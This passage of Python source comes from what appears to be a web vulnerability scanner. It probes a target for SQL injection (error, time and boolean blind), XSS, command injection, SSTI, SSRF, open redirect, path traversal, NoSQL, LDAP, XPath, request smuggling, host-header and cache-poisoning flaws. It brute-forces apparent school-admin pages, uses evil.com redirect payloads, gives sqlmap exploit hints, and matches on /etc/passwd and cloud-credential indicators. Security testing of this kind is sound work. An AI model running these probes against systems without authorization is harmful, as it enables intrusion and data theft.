                sqli_test_urls.append((form_url, form_params[:5]))

        # Brute-force common admin CRUD pages — the real-world SQLi targets
        ADMIN_CRUD_PAGES = [
            'list.php', 'view.php', 'edit.php', 'search.php', 'download.php',
            'upload.php', 'exam_info.php', 'hall_ticket.php', 'admission.php',
            'student_list.php', 'staff_list.php', 'fee_list.php', 'marks_list.php',
            'attendance_list.php', 'group_message.php', 'notice.php', 'circular.php',
            'get_exam_res_new.php', 'get_cumulative_report.php', 'check_batch.php',
            'find_duplicate.php', 'depromote.php', 'exam_add.php', 'exam_subjects.php',
            'online_admission_form.php', 'a_student_profile.php', 'acdemic_list.php',
            'announcement.php', 'awards.php', 'bonafide.php', 'career.php',
            'complaints.php', 'coordinator.php', 'document.php', 'email.php',
            'group.php', 'group_students.php', 'group_message_stud.php',
        ]
        ADMIN_PREFIXES = ['', 'admin/pages/', '../admin/pages/', 'site/', '../site/']
        ADMIN_PARAMS = ['id', 'ad_id', 'ad_no', 'no', 'exam_id']
        for page in ADMIN_CRUD_PAGES:
            for prefix in ADMIN_PREFIXES:
                for param in ADMIN_PARAMS[:3]:
                    test_url = f'https://{target}/{prefix}{page}?{param}=1'
                    sqli_test_urls.append((test_url, [param]))

        log('info', f'[VULNSCAN] SQLi testing {len(sqli_test_urls)} URL/param combinations')

        for test_base, params_for_url in sqli_test_urls:
            if not scan_state.get('scanning'):
                break

            for param in params_for_url:
                if not scan_state.get('scanning'):
                    break

                # Error-based SQLi
                for payload in sqli_payloads[:15]:
                    if '?' in test_base:
                        sqli_url = f'{test_base}&{param}={payload}'
                    else:
                        sqli_url = f'{test_base}?{param}={payload}'
                    try:
                        r, _ = timed_request(sqli_url)
                        if r:
                            db_specific_errors = [
                                'ORA-', 'ORA0', 'ORA1', 'postgresql', 'pg_query', 'pg_exec',
                                'sqlite3::', 'SQLite3::', 'SQLSTATE', 'ODBC', 'JDBC',
                                'Microsoft OLE DB', 'SQL Server', 'MySqlClient', 'com.mysql.jdbc',
                                'org.postgresql', 'unclosed quotation', 'Column count doesn\'t match',
                                'unterminated quoted string', 'quoted string not properly terminated',
                                'valid MySQL result', 'supplied argument is not a valid MySQL',
                                'Division by zero in', 'Warning: mysql',
                            ]
                            for err in db_specific_errors:
                                if err.lower() in r.text.lower() and err.lower() not in (baseline_r.text.lower() if baseline_r else ''):
                                    vulnscan['sqli'].append({'url': sqli_url, 'param': param, 'type': 'error-based', 'evidence': f'DB error pattern: {err}', 'payload': payload})
                                    add_finding('critical', f'SQL Injection (Error-based): {param}',
                                        sub=f'Error-based SQLi on ?{param}= - DB error: {err}', asset=sqli_url,
                                        cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1190',
                                        details=f'Type: Error-based SQL Injection\nPayload: {payload}\nDB error pattern found: {err}\nNot present in baseline: YES\nURL: {sqli_url}\n\nRemediation: Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.')
                                    log('err', f'[VULNSCAN] SQLi on ?{param}= ({err}) at {sqli_url}')
                                    break
                    except Exception:
                        pass

                # Time-based blind SQLi
                for payload in [p for p in sqli_payloads if 'SLEEP' in p.upper() or 'WAITFOR' in p.upper() or 'pg_sleep' in p.lower()][:3]:
                    if '?' in test_base:
                        sqli_url = f'{test_base}&{param}={payload}'
                    else:
                        sqli_url = f'{test_base}?{param}={payload}'
                    try:
                        r, elapsed = timed_request(sqli_url, timeout=10)
                        if elapsed >= 4.5:
                            vulnscan['sqli'].append({'url': sqli_url, 'param': param, 'type': 'time-based blind', 'evidence': f'Response delayed {elapsed:.1f}s', 'payload': payload})
                            add_finding('critical', f'SQL Injection (Time-based Blind): {param}',
                                sub=f'Time-based blind SQLi on ?{param}= - response delayed {elapsed:.1f}s', asset=sqli_url,
                                cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1190',
                                details=f'Type: Time-based Blind SQL Injection\nPayload: {payload}\nResponse time: {elapsed:.1f}s (baseline: {baseline_time:.1f}s)\nURL: {sqli_url}\n\nRemediation: Use parameterized queries/prepared statements.')
                            log('err', f'[VULNSCAN] Time-based SQLi on ?{param}= ({elapsed:.1f}s)')
                            break
                    except Exception:
                        pass

                # Boolean-based blind SQLi — integer-based (no quotes)
                # For URLs like list.php?id=1, test: ?id=1 AND 1=1 vs ?id=1 AND 1=2
                parsed_tb = urlparse(test_base)
                base_params = {k: v[0] if isinstance(v, list) else v
                               for k, v in parse_qs(parsed_tb.query).items()}
                original_val = base_params.get(param, '1')
                try:
                    true_params = dict(base_params)
                    true_params[param] = f'{original_val} AND 1=1--'
                    false_params = dict(base_params)
                    false_params[param] = f'{original_val} AND 1=2--'
                    url_base = f'{parsed_tb.scheme}://{parsed_tb.netloc}{parsed_tb.path}'
                    r_true, _ = timed_request(f'{url_base}?{param}={original_val} AND 1=1--', method='GET')
                    r_false, _ = timed_request(f'{url_base}?{param}={original_val} AND 1=2--', method='GET')
                    if r_true and r_false:
                        len_diff = abs(len(r_true.text) - len(r_false.text))
                        baseline_vs_true = abs(baseline_len - len(r_true.text))
                        if len_diff > 50 and baseline_vs_true < len_diff:
                            vulnscan['sqli'].append({'url': url_base, 'param': param, 'type': 'boolean-blind-integer', 'evidence': f'Length diff: {len_diff}', 'payload': f'{original_val} AND 1=1-- vs {original_val} AND 1=2--'})
                            add_finding('critical', f'SQL Injection (Boolean Blind Integer): {param}',
                                sub=f'Boolean-blind SQLi on {test_base} param {param} — integer injection',
                                asset=url_base, cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1190',
                                details=f'Type: Boolean-based Blind SQL Injection (Integer)\n'
                                        f'True: {original_val} AND 1=1-- -> {len(r_true.text)} bytes\n'
                                        f'False: {original_val} AND 1=2-- -> {len(r_false.text)} bytes\n'
                                        f'Diff: {len_diff} bytes\nURL: {url_base}\n'
                                        f'Exploit: sqlmap -u "{test_base}" --batch --technique=B')
                            log('err', f'[VULNSCAN] Boolean-blind SQLi (integer) on {param} at {test_base}')
                except Exception:
                    pass

                # Boolean-based blind SQLi — string-based (with quotes)
                try:
                    true_params2 = dict(base_params)
                    true_params2[param] = "' AND '1'='1"
                    false_params2 = dict(base_params)
                    false_params2[param] = "' AND '1'='2"
                    r_true2, _ = timed_request(f'{url_base}?{param}=%27%20AND%20%271%27%3D%271', method='GET')
                    r_false2, _ = timed_request(f'{url_base}?{param}=%27%20AND%20%271%27%3D%272', method='GET')
                    if r_true2 and r_false2:
                        len_diff2 = abs(len(r_true2.text) - len(r_false2.text))
                        baseline_vs_true2 = abs(baseline_len - len(r_true2.text))
                        if len_diff2 > 50 and baseline_vs_true2 < len_diff2:
                            vulnscan['sqli'].append({'url': url_base, 'param': param, 'type': 'boolean-blind-string', 'evidence': f'Length diff: {len_diff2}', 'payload': "' AND '1'='1 vs ' AND '1'='2"})
                            add_finding('critical', f'SQL Injection (Boolean Blind String): {param}',
                                sub=f'Boolean-blind SQLi on {test_base} param {param} — string injection',
                                asset=url_base, cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1190',
                                details=f'Type: Boolean-based Blind SQL Injection (String)\n'
                                        f'URL: {url_base}\n'
                                        f'Exploit: sqlmap -u "{test_base}" --batch --technique=B')
                            log('err', f'[VULNSCAN] Boolean-blind SQLi (string) on {param} at {test_base}')
                except Exception:
                    pass

    except Exception as e:
        log('warn', f'[VULNSCAN] SQLi testing error: {e}')

    try:
        # ═══════════════════════════════════════════════════════════════════════
        # 2. ADVANCED XSS TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing XSS vectors...')
        for param in test_params[:10]:
            if not scan_state.get('scanning'):
                break

            for payload in xss_payloads[:10]:
                xss_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(xss_url)
                    if r and payload in r.text:
                        # Check if it's actually rendered (not in a script context or encoded)
                        content_type = r.headers.get('content-type', '')
                        if 'text/html' in content_type:
                            vulnscan['xss'].append({'url': xss_url, 'param': param, 'type': 'reflected', 'evidence': 'Payload reflected unencoded', 'payload': payload})
                            add_finding('high', f'Reflected XSS: {param}',
                                sub=f'XSS payload reflected on ?{param}=', asset=xss_url,
                                cvss='6.1', exploit='PUBLIC', owasp='A03', mitre='T1559',
                                details=f'Type: Reflected XSS\nPayload: {payload}\nReflected in HTML response without encoding\nURL: {xss_url}\n\nRemediation: HTML-encode all user input before rendering. Implement Content-Security-Policy.')
                            log('err', f'[VULNSCAN] XSS on ?{param}=')
                            break
                except Exception:
                    pass

            # Test for DOM-based XSS indicators in page source
            # Only flag if the parameter value is actually reflected in a dangerous sink
            try:
                test_payload = 'INJECTION_TEST_8374'
                r, _ = timed_request(f'{base_url}/?{param}={test_payload}')
                if r and test_payload in r.text:
                    # The parameter value IS reflected in the page - now check for dangerous sinks
                    dom_sinks = ['document.write(', 'innerHTML', 'outerHTML', 'eval(',
                                 'setTimeout(', 'setInterval(', 'location.hash', 'location.search',
                                 'document.URL', 'document.referrer']
                    # Check if the reflected value is near a dangerous sink
                    page_text = r.text
                    reflected_idx = page_text.find(test_payload)
                    if reflected_idx >= 0:
                        # Look for sinks within 500 chars of the reflected value
                        context_start = max(0, reflected_idx - 500)
                        context_end = min(len(page_text), reflected_idx + 500)
                        context = page_text[context_start:context_end]
                        for sink in dom_sinks:
                            if sink in context:
                                vulnscan['xss'].append({'url': f'{base_url}/?{param}=test', 'param': param, 'type': 'dom-based', 'evidence': f'DOM sink found: {sink}', 'payload': test_payload})
                                add_finding('medium', f'DOM-based XSS: {param}',
                                    sub=f'Parameter {param} reflected near dangerous sink "{sink}"',
                                    asset=base_url,
                                    cvss='6.1', owasp='A03', mitre='T1559',
                                    details=f'Type: DOM-based XSS\nParameter: {param}\nSink: {sink}\nPayload: {test_payload}\nReflected at position: {reflected_idx}\n\nRemediation: Use DOMPurify to sanitize user input. Apply context-aware output encoding.')
                                log('err', f'[VULNSCAN] CONFIRMED DOM XSS: {param} reflected near {sink}')
                                break
                else:
                    log('info', f'[VULNSCAN] DOM XSS ?{param}= not reflected in page, skipping')
            except Exception:
                pass

        # ═══════════════════════════════════════════════════════════════════════
        # 3. COMMAND INJECTION TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Command Injection vectors...')
        for param in ['cmd', 'exec', 'command', 'shell', 'ping', 'ip', 'host', 'domain', 'file', 'path', 'url', 'query'][:8]:
            if not scan_state.get('scanning'):
                break

            for payload in cmdi_payloads[:8]:
                cmdi_url = f'{base_url}/?{param}={payload}'
                try:
                    r, elapsed = timed_request(cmdi_url, timeout=10)
                    if r:
                        # False-positive guard: skip if response is a normal HTML page
                        resp_lower = r.text.lower()
                        if any(tag in resp_lower for tag in ['<html', '<head', '<body', '<!doctype']):
                            continue
                        cmd_indicators = ['root:x:', 'uid=0', 'uid=1000', 'drwxr-xr-x', '-rw-r--r--',
                                          '/bin/bash', '/bin/sh', '/etc/passwd']
                        matched = [x for x in cmd_indicators if x in resp_lower]
                        if matched:
                            vulnscan['cmdi'].append({'url': cmdi_url, 'param': param, 'type': 'output-based', 'evidence': f'Command output detected: {matched}', 'payload': payload})
                            add_finding('critical', f'Command Injection: {param}',
                                sub=f'OS command injection on ?{param}=', asset=cmdi_url,
                                cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1059',
                                details=f'Type: OS Command Injection\nPayload: {payload}\nCommand output detected: {matched}\nURL: {cmdi_url}\n\nRemediation: Never pass user input to system commands. Use language-native APIs instead.')
                            log('err', f'[VULNSCAN] CMDi on ?{param}=')
                            break
                    # Time-based detection for sleep payloads — require significant delay
                    if 'sleep' in payload.lower() and elapsed >= 7.0 and (elapsed - 3.0) >= 5.0:
                        vulnscan['cmdi'].append({'url': cmdi_url, 'param': param, 'type': 'time-based', 'evidence': f'Response delayed {elapsed:.1f}s', 'payload': payload})
                        add_finding('critical', f'Command Injection (Time-based): {param}',
                            sub=f'Time-based CMDi on ?{param}= - delayed {elapsed:.1f}s', asset=cmdi_url,
                            cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1059',
                            details=f'Type: Time-based Command Injection\nPayload: {payload}\nResponse delay: {elapsed:.1f}s\nURL: {cmdi_url}')
                        log('err', f'[VULNSCAN] Time-based CMDi on ?{param}=')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 4. SSTI TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing SSTI vectors...')
        for param in ['template', 'tpl', 'view', 'page', 'name', 'debug', 'id', 'file'][:6]:
            if not scan_state.get('scanning'):
                break

            for payload in ssti_payloads[:6]:
                ssti_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(ssti_url)
                    if r:
                        # Check for arithmetic evaluation
                        if '{{7*7}}' in payload and '49' in r.text:
                            vulnscan['ssti'].append({'url': ssti_url, 'param': param, 'type': 'arithmetic', 'evidence': 'SSTI confirmed (7*7=49)', 'payload': payload})
                            add_finding('critical', f'SSTI: {param}',
                                sub=f'Server-Side Template Injection on ?{param}=', asset=ssti_url,
                                cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1059',
                                details=f'Type: Server-Side Template Injection\nPayload: {payload}\nTemplate expression evaluated (7*7=49)\nURL: {ssti_url}\n\nRemediation: Never render user input in templates. Use sandboxed template engines.')
                            log('err', f'[VULNSCAN] SSTI on ?{param}=')
                            break
                        if '${7*7}' in payload and '49' in r.text:
                            vulnscan['ssti'].append({'url': ssti_url, 'param': param, 'type': 'arithmetic', 'evidence': 'SSTI confirmed (${7*7}=49)', 'payload': payload})
                            add_finding('critical', f'SSTI: {param}',
                                sub=f'Server-Side Template Injection on ?{param}=', asset=ssti_url,
                                cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1059',
                                details=f'Type: Server-Side Template Injection\nPayload: {payload}\nURL: {ssti_url}')
                            log('err', f'[VULNSCAN] SSTI on ?{param}=')
                            break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 5. SSRF TESTING (Advanced)
        # Requires: the response must contain content that proves the server
        # fetched our internal URL (e.g., EC2 metadata JSON keys, not just
        # the word "aws" or "localhost" in page text)
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing SSRF vectors...')
        for param in ssrf_params[:8]:
            if not scan_state.get('scanning'):
                break

            for payload in ssrf_payloads[:8]:
                ssrf_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(ssrf_url)
                    if not r:
                        continue
                    # Require proof: the payload URL's content must be reflected
                    # e.g., if payload is http://169.254.169.254/... check for
                    # EC2 metadata JSON keys that ONLY exist in the metadata response
                    ssrf_proof_indicators = [
                        'ami-id', 'ami-launch-index', 'ami-manifest-path',
                        'instance-id', 'instance-type', 'local-hostname',
                        'local-ipv4', 'public-hostname', 'public-ipv4',
                        'security-credentials', 'iam/security-credentials',
                        'instance-action', 'instance-life-cycle',
                    ]
                    # Also check for the payload URL being reflected (proves server fetched it)
                    payload_reflected = payload.lower() in r.text.lower() and payload not in ssrf_url
                    # False-positive guard: skip if response is a normal HTML page
                    resp_lower = r.text.lower()
                    resp_is_html = any(tag in resp_lower for tag in ['<html', '<head', '<body', '<div', '<!doctype'])
                    if resp_is_html and not payload_reflected:
                        continue
                    matched_proofs = [x for x in ssrf_proof_indicators if x in resp_lower]
                    has_proof = len(matched_proofs) >= 2
                    if has_proof or payload_reflected:
                        vulnscan['ssrf'].append({'url': ssrf_url, 'param': param, 'type': 'response-based', 'evidence': f'SSRF confirmed (proof indicators found)', 'payload': payload})
                        add_finding('critical', f'SSRF: {param}',
                            sub=f'Server-Side Request Forgery on ?{param}= - server fetched internal resource',
                            asset=ssrf_url, cvss='9.1', exploit='PUBLIC', owasp='A10', mitre='T1552',
                            details=f'Type: Server-Side Request Forgery\nPayload: {payload}\nProof indicators: {matched_proofs}\nPayload reflected: {payload_reflected}\nURL: {ssrf_url}\n\nRemediation: Validate and whitelist all URLs. Block internal IP ranges.')
                        log('err', f'[VULNSCAN] SSRF on ?{param}= (proof found)')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 6. OPEN REDIRECT TESTING (with false-positive reduction)
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Open Redirect vectors...')
        redirect_params = ['redirect', 'return', 'next', 'dest', 'destination', 'redir',
                           'redirect_uri', 'url', 'link', 'goto', 'checkout_url', 'ref', 'uri']
        redirect_test_payloads = [
            ('https://evil.com', 'evil.com'),
            ('//evil.com', 'evil.com'),
            ('http://evil.com', 'evil.com'),
            ('https://evil.com%00legitimate.com', 'evil.com'),
            ('///evil.com', 'evil.com'),
        ]
        for param in redirect_params[:8]:
            if not scan_state.get('scanning'):
                break
            for payload, evil_domain in redirect_test_payloads:
                redir_url = f'{base_url}/?{param}={payload}'
                try:
                    # Use allow_redirects=False to inspect the raw redirect
                    r = req_lib.get(redir_url, timeout=8, verify=False, allow_redirects=False,
                                    headers=headers)
                    if r is None or r.status_code not in (301, 302, 303, 307, 308):
                        continue
                    loc = r.headers.get('Location', '')
                    if not loc:
                        continue
                    # Parse the Location header
                    loc_lower = loc.lower().strip()
                    parsed_loc = urlparse(loc)
                    # FALSE POSITIVE CHECKS:
                    # 1. Location is same-domain (not external redirect)
                    if parsed_loc.hostname and target in parsed_loc.hostname:
                        continue
                    # 2. Location is a relative path (starts with /)
                    if loc.startswith('/') and not loc.startswith('//'):
                        continue
                    # 3. Location points to a login/error page on same domain
                    if any(x in loc_lower for x in ['/login', '/signin', '/error', '/404', '/unauthorized']):
                        continue
                    # 4. Location is empty or just a fragment
                    if not loc or loc.startswith('#'):
                        continue
                    # POSITIVE CONFIRMATION: Location must contain the evil domain
                    if evil_domain in loc_lower:
                        # Second request to confirm redirect chain
                        try:
                            confirm = req_lib.get(redir_url, timeout=8, verify=False,
                                                  allow_redirects=True, headers=headers)
                            final_url = confirm.url.lower()
                            if evil_domain in final_url:
                                evidence = f'Payload: {payload}\\nLocation: {loc}\\nFinal URL: {confirm.url}\\nStatus: {r.status_code}'
                                vulnscan['open_redirect'].append({
                                    'url': redir_url, 'param': param,
                                    'evidence': evidence, 'payload': payload,
                                    'verified': True
                                })
                                add_finding('medium', f'Open Redirect: {param}',
                                    sub=f'Open redirect on ?{param}= via {payload}',
                                    asset=redir_url,
                                    cvss='6.1', exploit='PUBLIC', owasp='A01', mitre='T1036',
                                    details=f'Type: Open Redirect\\nParameter: {param}\\nPayload: {payload}\\nRedirect Location: {loc}\\nFinal URL: {confirm.url}\\nHTTP Status: {r.status_code}\\nURL: {redir_url}\\n\\nRemediation: Validate redirect URLs against a whitelist of allowed domains. Never accept user-supplied URLs for redirects.')
                                log('err', f'[VULNSCAN] CONFIRMED Open Redirect on ?{param}= -> {loc}')
                                break
                            else:
                                log('info', f'[VULNSCAN] Open Redirect ?{param}= FALSE POSITIVE: final URL {confirm.url} does not contain evil.com')
                        except Exception:
                            # Could not confirm, skip
                            log('info', f'[VULNSCAN] Open Redirect ?{param}= unconfirmable, skipping')
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 7. PATH TRAVERSAL / LFI TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Path Traversal vectors...')
        for param in ['file', 'path', 'page', 'include', 'template', 'view', 'document',
                       'folder', 'root', 'pg', 'style', 'pdf', 'lang', 'cmd'][:8]:
            if not scan_state.get('scanning'):
                break

            for payload in path_traversal_payloads[:6]:
                pt_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(pt_url)
                    if r:
                        lfi_indicators = ['root:', '[boot loader]', 'daemon:', 'nobody:',
                                          'windows', 'system32', '[fonts]', 'for 16-bit']
                        if any(x in r.text.lower() for x in lfi_indicators):
                            vulnscan['path_traversal'].append({'url': pt_url, 'param': param, 'evidence': 'File content disclosed', 'payload': payload})
                            add_finding('critical', f'Path Traversal / LFI: {param}',
                                sub=f'Local file inclusion on ?{param}=', asset=pt_url,
                                cvss='7.5', exploit='PUBLIC', owasp='A01', mitre='T1083',
                                details=f'Type: Path Traversal / Local File Inclusion\nPayload: {payload}\nFile system content disclosed\nURL: {pt_url}\n\nRemediation: Use a whitelist of allowed files. Never pass user input directly to file operations.')
                            log('err', f'[VULNSCAN] Path Traversal on ?{param}=')
                            break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 8. NOSQL INJECTION TESTING
        # Requires: (a) baseline returns error/non-200, then (b) payload returns 200 with DIFFERENT content
        # OR: payload causes auth bypass / data exfiltration markers
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing NoSQL Injection vectors...')
        for param in ['user', 'username', 'email', 'name', 'id', 'query', 'search'][:6]:
            if not scan_state.get('scanning'):
                break

            # Get baseline first
            try:
                baseline_r, _ = timed_request(f'{base_url}/?{param}=normaltest')
                baseline_status = baseline_r.status_code if baseline_r else 0
                baseline_len = len(baseline_r.text) if baseline_r else 0
            except Exception:
                baseline_status = 0
                baseline_len = 0

            for payload in nosql_payloads[:4]:
                nosql_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(nosql_url)
                    if not r:
                        continue
                    # Must show behavioral change: different status code, or significantly different response
                    # AND must contain NoSQL-specific indicators (not just any large page)
                    nosql_indicators = ['$', 'gt', 'ne', 'regex', 'where', 'find', 'aggregate',
                                        'mapreduce', 'mongod', 'nosql', 'syntax error']
                    has_indicator = any(x in r.text.lower() for x in nosql_indicators)
                    status_changed = r.status_code != baseline_status and r.status_code == 200
                    size_anomaly = abs(len(r.text) - baseline_len) > baseline_len * 0.5 if baseline_len > 0 else False
                    if (status_changed or size_anomaly) and has_indicator:
                        vulnscan['nosqli'].append({'url': nosql_url, 'param': param, 'evidence': f'NoSQL error/behavioral change (status {r.status_code}, baseline {baseline_status})', 'payload': payload})
                        add_finding('high', f'NoSQL Injection: {param}',
                            sub=f'NoSQL injection on ?{param}= - payload caused behavioral change',
                            asset=nosql_url, cvss='8.0', exploit='PUBLIC', owasp='A03', mitre='T1190',
                            details=f'Type: NoSQL Injection\nPayload: {payload}\nBaseline status: {baseline_status}, response after payload: {r.status_code}\nResponse size change: {baseline_len} -> {len(r.text)}\nIndicators found: {[x for x in nosql_indicators if x in r.text.lower()]}\nURL: {nosql_url}\n\nRemediation: Sanitize and validate all input. Use parameterized queries for database operations.')
                        log('err', f'[VULNSCAN] NoSQLi on ?{param}= (status changed {baseline_status}->{r.status_code})')
                        break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 9. HTTP REQUEST SMUGGLING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing HTTP Request Smuggling...')
        try:
            for smuggle in http_smuggling_payloads[:2]:
                if not scan_state.get('scanning'):
                    break
                try:
                    sock = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, 443))
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ssock = ctx.wrap_socket(sock, server_hostname=target)

                    payload_str = f'POST / HTTP/1.1\r\nHost: {target}\r\n'
                    for h, v in smuggle['headers'].items():
                        payload_str += f'{h}: {v}\r\n'
                    payload_str += f'\r\n{smuggle["body"]}'
                    ssock.send(payload_str.encode())
                    try:
                        resp = ssock.recv(4096).decode(errors='ignore')
                        if '200' in resp or '302' in resp:
                            vulnscan['http_smuggling'].append({'type': smuggle['name'], 'evidence': 'Server accepted conflicting headers'})
                    except Exception:
                        pass
                    ssock.close()
                except Exception:
                    pass
        except Exception:
            pass

        # ═══════════════════════════════════════════════════════════════════════
        # 10. HOST HEADER INJECTION
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Host Header Injection...')
        for payload in host_injection_payloads[:4]:
            if not scan_state.get('scanning'):
                break
            try:
                r, _ = timed_request(base_url, extra_headers={'Host': payload})
                if r and r.status_code in (200, 301, 302):
                    # Check if the injected host appears in response
                    if payload.split('/')[0] in r.text or payload in r.headers.get('Location', ''):
                        vulnscan['host_injection'].append({'host': payload, 'evidence': 'Host header reflected in response'})
                        add_finding('high', f'Host Header Injection: {payload}',
                            sub=f'Host header injection with value: {payload}', asset=base_url,
                            cvss='7.0', owasp='A03', mitre='T1190',
                            details=f'Type: Host Header Injection\nInjected Host: {payload}\nThe server reflected the injected host in the response.\nURL: {base_url}\n\nRemediation: Validate the Host header against a whitelist of allowed domains.')
                        log('err', f'[VULNSCAN] Host injection: {payload}')
                        break
            except Exception:
                pass

        # ═══════════════════════════════════════════════════════════════════════
        # 11. CACHE POISONING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Cache Poisoning vectors...')
        cache_headers_to_test = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Forwarded-Scheme', 'https'),
        ]
        for hdr, val in cache_headers_to_test:
            if not scan_state.get('scanning'):
                break
            try:
                r, _ = timed_request(base_url, extra_headers={hdr: val})
                if not r:
                    continue
                cache_indicators = ['x-cache', 'cf-cache-status', 'x-cache-hits', 'x-varnish']
                has_cache = any(h in [k.lower() for k in r.headers.keys()] for h in cache_indicators)
                # Check if response is actually cacheable (cache-control must allow caching)
                cc = r.headers.get('cache-control', '').lower()
                is_cacheable = 'no-store' not in cc and 'private' not in cc
                # Check if the injected value appears in a reflection point (URL context, not just random text)
                reflection_points = [
                    f'//{val}', f'https://{val}', f'http://{val}',
                    f'"{val}"', f"'{val}'",
                    f'/{val}/', f'={val}&',
                ]
                reflected_in_url = any(pt in r.text for pt in reflection_points)
                if has_cache and is_cacheable and reflected_in_url:
                    vulnscan['cache_poisoning'].append({'header': hdr, 'value': val, 'evidence': f'Injected value reflected in URL context in cached response (cache headers: {[h for h in cache_indicators if h in [k.lower() for k in r.headers.keys()]]})'})
                    add_finding('high', f'Web Cache Poisoning: {hdr}',
                        sub=f'Cache poisoning via {hdr}: {val} - value reflected in URL context',
                        asset=base_url, cvss='6.0', owasp='A05', mitre='T1190',
                        details=f'Type: Web Cache Poisoning\nHeader: {hdr}: {val}\nInjected value reflected in URL context in response.\nCache headers present: {[h for h in cache_indicators if h in [k.lower() for k in r.headers.keys()]]}\nCache-Control: {cc}\nURL: {base_url}\n\nRemediation: Normalize or strip unkeyed headers. Validate Host header.')
                    log('err', f'[VULNSCAN] Cache poisoning via {hdr} (confirmed reflection)')
                    break
            except Exception:
                pass

        # ═══════════════════════════════════════════════════════════════════════
        # 12. LDAP INJECTION
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing LDAP Injection vectors...')
        for param in ['user', 'username', 'name', 'cn', 'uid', 'filter', 'search'][:4]:
            if not scan_state.get('scanning'):
                break
            for payload in ldap_payloads[:3]:
                ldap_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(ldap_url)
                    if r:
                        ldap_errors = ['ldap', 'LDAP', 'Invalid DN', 'Search is not valid',
                                       'javax.naming', 'com.sun.jndi', 'NamingException']
                        if any(e in r.text for e in ldap_errors):
                            vulnscan['ldap_injection'].append({'url': ldap_url, 'param': param, 'evidence': 'LDAP error disclosed', 'payload': payload})
                            add_finding('high', f'LDAP Injection: {param}',
                                sub=f'LDAP injection on ?{param}=', asset=ldap_url,
                                cvss='8.0', owasp='A03', mitre='T1190',
                                details=f'Type: LDAP Injection\nPayload: {payload}\nLDAP error in response\nURL: {ldap_url}\n\nRemediation: Use parameterized LDAP queries. Escape special LDAP characters.')
                            log('err', f'[VULNSCAN] LDAP injection on ?{param}=')
                            break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 13. XPATH INJECTION
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing XPath Injection vectors...')
        for param in ['user', 'id', 'name', 'search', 'query', 'login'][:4]:
            if not scan_state.get('scanning'):
                break
            for payload in xpath_payloads[:3]:
                xpath_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(xpath_url)
                    if r:
                        xpath_errors = ['xpath', 'XPath', 'xmlXPath', 'SimpleXML',
                                        'DOMDocument', 'XPathException', 'Invalid expression']
                        if any(e in r.text for e in xpath_errors):
                            vulnscan['xpath_injection'].append({'url': xpath_url, 'param': param, 'evidence': 'XPath error disclosed', 'payload': payload})
                            add_finding('high', f'XPath Injection: {param}',
                                sub=f'XPath injection on ?{param}=', asset=xpath_url,
                                cvss='7.5', owasp='A03', mitre='T1190',
                                details=f'Type: XPath Injection\nPayload: {payload}\nXPath error in response\nURL: {xpath_url}\n\nRemediation: Use parameterized XPath queries. Sanitize input.')
                            log('err', f'[VULNSCAN] XPath injection on ?{param}=')
                            break
                except Exception:
                    pass

        # ═══════════════════════════════════════════════════════════════════════
        # 14. PROTOTYPE POLLUTION (JSON endpoints)
        # Requires: (a) GET baseline, then (b) POST/GET with payload AND
        # verify the polluted property (__proto__, constructor, etc.) is reflected back
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing Prototype Pollution...')
        for param in ['data', 'input', 'json', 'config', 'settings', 'options'][:4]:
            if not scan_state.get('scanning'):
                break

            # Get baseline first
            try:
                baseline_r, _ = timed_request(f'{base_url}/?{param}=normaltest')
                baseline_status = baseline_r.status_code if baseline_r else 0
                baseline_len = len(baseline_r.text) if baseline_r else 0
            except Exception:
                baseline_status = 0
                baseline_len = 0

            for payload in proto_payloads[:2]:
                pp_url = f'{base_url}/?{param}={payload}'
                try:
                    r, _ = timed_request(pp_url)
                    if not r:
                        continue
                    # Must show behavioral change AND contain pollution indicators
